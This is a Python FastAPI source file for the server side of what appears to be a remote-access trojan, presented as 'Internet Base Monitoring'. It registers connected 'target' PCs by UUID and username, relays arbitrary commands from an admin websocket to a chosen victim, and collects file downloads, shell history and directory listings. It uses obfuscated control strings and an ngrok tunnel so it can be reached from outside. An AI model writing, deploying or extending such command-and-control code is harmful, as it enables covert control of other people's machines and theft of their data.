import asyncio
import pprint
import time

import starlette
from fastapi import FastAPI, WebSocket, HTTPException
# from fastapi.security import APIKeyHeader
from starlette.middleware.cors import CORSMiddleware
from starlette.websockets import WebSocketDisconnect

import utils
from database import crud
from database.db import create_db_and_tables

# app
app = FastAPI(
    title='WebSocket Internet Base Monitoring 101',
    version='1.0.0',
    redoc_url='/api/v1/docs'
)

# cors
app.add_middleware(
    CORSMiddleware,
    allow_origins=['*'],
    allow_credentials=True,
    allow_methods=['*'],
    allow_headers=['*'],
)

# Store connected clients
clients = {}  # {client_id: websocket}
admin_websocket = None


async def select_client_to_interact_with(websocket: WebSocket):
    message = {}
    message["clients"] = []
    for i, (client_id, client_ws) in enumerate(clients.items()):
        # Create a dictionary to hold client information
        client_info = {"client_id": str(client_id),
                       "address": f"{client_ws.client.host}:{client_ws.client.port}"
                       }
        message["clients"].append(client_info)

    message["message"] = "Note! Reply with the client_id you want to interact with. (zero '0' for Refresh)"
    await websocket.send_json(message)

    data = await websocket.receive_text()
    return data


async def handle_client_interaction(client_websocket: WebSocket, admin_websocket: WebSocket):
    # print(f"Interacting with Client {selected_client_id} {client_ws.client.host}:{client_ws.client.port}")
    print(f"Connected by {client_websocket.client.host}:{client_websocket.client.port}")

    first_time = True
    try:
        while True:
            if first_time:
                await client_websocket.send_text("1")
                first_time = False
                continue

            try:
                command = await admin_websocket.receive_text()
                # Process the received command
            except Exception as e:
                await client_websocket.send_text("switch")
                time.sleep(0.005)
                return True

            # want to wait until active again
            if command.lower().startswith('switch'):
                await client_websocket.send_text(command)
                return True
            elif command.lower().startswith('download'):
                _, filename = command.split(' ', 1)
                cmd = "%*&#!download"
                filepath = f"{filename}"
                command = f"{cmd} {filepath}"
                await client_websocket.send_text(command)
                continue

            await client_websocket.send_text(command)

    except WebSocketDisconnect as e:
        code, reason = e.args
        print(f"WebSocket disconnected with code: {code}, reason: {reason}")
        print(f"Connection with {client_websocket.client.host} disconnected.")
        return False
    except Exception as e:
        print(f"Exception with {client_websocket.client.host}: {e}")
        return False
    except:
        print("Unexpected message received.")
        return False


@app.websocket("/ws/client")
async def websocket_endpoint_client(websocket: WebSocket):
    await websocket.accept()
    client_id = len(clients) + 1
    clients[client_id] = {"ws": websocket}
    try:
        get_username = await websocket.receive_text()
        if get_username.lower().startswith(".%."):
            client_data = await websocket.receive_json()
            clients[client_id]["client_data"] = client_data

        while True:
            client_data = await websocket.receive_text()

            if client_data.lower().startswith('%*&#!download'):
                print("receive file")
                _, filename = client_data.split(' ', 1)
                # Use asyncio to concurrently receive file in the background
                response = await asyncio.create_task(utils.receive_file(websocket, filename))
                await admin_websocket.send_json({"client": client_id, "response": str(response)})
                continue

            elif client_data.lower().startswith('history'):
                hist = await websocket.receive_json()
                data = {"client": client_id,
                        "today": utils.today(),
                        "hist": hist}
                await admin_websocket.send_json(data)
                continue

            elif client_data.lower().startswith('cwd%`'):
                cwd = client_data[5:]
                client_data = await websocket.receive_json()

                status = crud.add_target_pc(client_data)
                if status == "%&%":
                    await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
                else:
                    if status.username_changed:
                        client_data["username"] = status.updated_username
                    else:
                        client_data["username"] = status.username
                    await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
                continue

            elif client_data.lower().startswith("ls"):
                client_data = await websocket.receive_json()
                await admin_websocket.send_json({"client": client_id, "response": client_data})
                continue

            await admin_websocket.send_json({"client": client_id, "response": client_data})
    except:
        del clients[client_id]


@app.websocket("/ws-remote-access/admin")
async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_id: int | None):
    global admin_websocket
    admin_websocket = websocket
    await websocket.accept()
    max_client_id = len(clients)
    if client_id is None or (client_id <= 0) or (client_id > max_client_id):
        await websocket.send_text(
            "Please provide a valid client_id to connect with \nFind details: https://0.tcp.ap.ngrok.io:<enter-port>/get-clients")
        await admin_websocket.close(code=1000)  # Close the WebSocket connection gracefully
        return
    if await utils.is_client_admin(api_key):
        switched = False
        try:
            while not switched:
                # client_id = await select_client_to_interact_with(websocket)
                selected_index = int(client_id) - 1
                if 0 <= selected_index < len(clients):
                    selected_client_id = list(clients.keys())[selected_index]
                    client_ws = clients[selected_client_id]['ws']

                while await handle_client_interaction(client_ws, websocket):
                    switched = True
                    break
        except KeyboardInterrupt:
            print("Server terminated by the user.")
        except WebSocketDisconnect as e:
            code, reason = e.args
            print(f"WebSocket disconnected with code: {code}, reason: {reason}")
            print(f"Connection with {websocket.client.host} disconnected.")
        except Exception as e:
            print("Server Error: ", str(e))


@app.get("/get-clients")
async def get_clients():
    message = {}
    message["clients"] = []

    for client_id, client_info in clients.items():
        # Check if the current item represents a WebSocket client
        if "ws" in client_info:
            client_ws = client_info["ws"]
            # Create a dictionary to hold client information
            client_data = client_info.get("client_data", {})

            db_registered_pc = crud.add_target_pc(client_data)
            if db_registered_pc.username_changed:
                client_data["username"] = db_registered_pc.updated_username
            else:
                client_data["username"] = db_registered_pc.username

            client_info = {
                "client_id": client_id,
                "address": f"{client_ws.client.host}:{client_ws.client.port}",
                "username": client_data['username'],
                "system_uuid": client_data['system_uuid']
            }
            message["clients"].append(client_info)

    return message


@app.patch("/update-username/{system_uuid}")
def update_username(system_uuid: str, new_username: str):
    """
    :param new_username: The new username to be updated.
    :param system_uuid: The unique identifier of the system.
    :return: A dictionary containing the status of the update operation.
    """
    status = crud.update_username(new_username, system_uuid)
    if status:
        return {'success': True, 'message': "Client Name Updated Successfully", 'status': 200}  # Successful update
    else:
        raise HTTPException(status_code=404, detail="Invalid UUID")


if __name__ == "__main__":
    create_db_and_tables()
    import uvicorn

    uvicorn.run(app, host="192.168.88.55", port=8000, ssl_keyfile='./server.key',
                ssl_certfile='./server.crt',
                log_level="info")

    # uvicorn.run(app, host="127.0.0.1", port=8000, log_level="info")
